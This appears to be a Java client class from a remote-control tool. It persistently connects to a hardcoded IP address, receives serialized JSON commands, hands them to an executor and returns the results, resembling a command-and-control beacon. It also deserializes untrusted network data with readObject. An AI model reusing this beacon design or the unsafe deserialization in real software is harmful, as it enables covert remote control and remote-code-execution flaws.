package manipulateClient;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.OutputStream;
import java.net.Socket;

import org.json.JSONObject;

import base.MsgJSON;
import base.RootSocket;

public class Client extends Thread {

	private static Client client;
	private Socket s;
	InputStream inputStream;
	OutputStream outputStream;

	private Client() {
		getSocket();
	}

	public static Client getClient() {
		if (client == null) {
			synchronized (Client.class) {
				if (client == null) {
					client = new Client();
				}
			}
		}
		return client;
	}

	@Override
	public void run() {
		while (true) {
			try {
				inputStream = s.getInputStream();
				outputStream = s.getOutputStream();
				ObjectInputStream ois = new ObjectInputStream(inputStream);
				Object readObject = ois.readObject();
				if(readObject instanceof String){
					JSONObject jo = MsgJSON.parseString(readObject.toString());
					if(jo!=null){
						JSONObject execute = new Dispose(jo).execute();
						new Send(execute).start();
					}
				}
				
			} catch (IOException e) {
				// 流出错 重新获取端口 
				e.printStackTrace();
				getSocket();
				continue;
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			
			
		}
	}

	private void getSocket() {
		while (true) {
			try {
				s = new Socket("111.230.249.24", 9999);
//				System.out.println(11);
				RootSocket.socket = s;
				// 发送认证包
				s.getOutputStream().write(new byte[] { 1 });
				break;
			} catch (Exception e) {
				continue;
			}
		}
	}

}
